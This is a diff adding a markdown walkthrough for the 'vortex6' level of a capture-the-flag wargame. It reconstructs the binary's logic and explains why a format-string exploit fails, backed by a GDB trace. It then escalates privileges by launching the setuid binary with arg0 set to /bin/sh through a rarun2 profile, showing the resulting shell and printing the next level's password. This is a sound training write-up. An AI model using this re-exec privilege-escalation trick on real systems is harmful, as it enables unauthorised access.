@@ -1,0 +1,71 @@
+# Reversing
+
+This is one of the first levels where the source is not available so you need to reverse the binary
+
+The code is something similar to this: -
+
+## Psuedo C/Python
+```
+int main(int argc, char* argv[], char* envp[]) {
+    if envp[0] != 0:
+      restart(argv[0])
+    else:
+      printf(envp[3])
+    // _exit() implicit call here
+}
+
+void restart(arg0) {
+    execlp(arg0)
+}
+```
+
+It looks a little similar to vortex4 where there is a format string vulnerability
+But there is also another vulnerability, it restarts itself based off arg0 and doesn't drop privileges,
+so we can just launch it with arg0 set to /bin/sh and it will restart and drop a shell. Too easy.
+
+Alternatively we'd have to play tricks where we overlap ENVP and ARGV so that ENVP[0] == 0 but ENVP[3] == fmt,
+and then use a format string to exploit the printf, overwriting the GOT/PLT for exit_. However it's not possible to do this.
+
+In vortex4 we needed argc == 0, but then to exploit `printf(argv[3])`. We were able to do this because if we had argc == 0 and argv[0] == 0
+then argv[1] would be envp[0], and hence argv[3] would be envp[2]. In vortex6 if envp[0] == 0, then envp[1] is the beginning of the
+ELF Auxiliary Vector, which would be AT_SYSINFO (http://code.metager.de/source/xref/linux/stable/arch/x86/um/asm/elf.h#AT_SYSINFO),
+envp[2] __kernel_vsyscall, and env[3] AT_SYSINFO_EHDR (33 (0x21)), hence it's not possible to exploit printf(argv[3]),
+as it will always be printf(0x21).
+
+This is confirmed in GDB: -
+
+```
+Program received signal SIGSEGV, Segmentation fault.
+0xf7648917 in strchrnul () from /lib32/libc.so.6
+(gdb) x/1i $pc
+=> 0xf7648917 <strchrnul+23>:   mov    cl,BYTE PTR [eax]
+(gdb) i r eax
+eax            0x21     33
+(gdb)
+```
+
+
+## Simple way, changing arg0
+
+# vortex6.rr
+```
+#!/usr/bin/rarun2
+program=/games/vortex/vortex6
+arg0=/bin/sh
+#stdin=foo.txt
+chdir=/etc/vortex_pass/
+#clearenv=true
+#chroot=.
+```
+
+
+`rarun2 vortex6.rr2`
+
+```
+$ id
+uid=5006(vortex6) gid=5006(vortex6) euid=5007(vortex7) groups=5007(vortex7),5006(vortex6)
+$ pwd
+/etc/vortex_pass
+$ cat vortex7
+Y52jxHtt/
+```
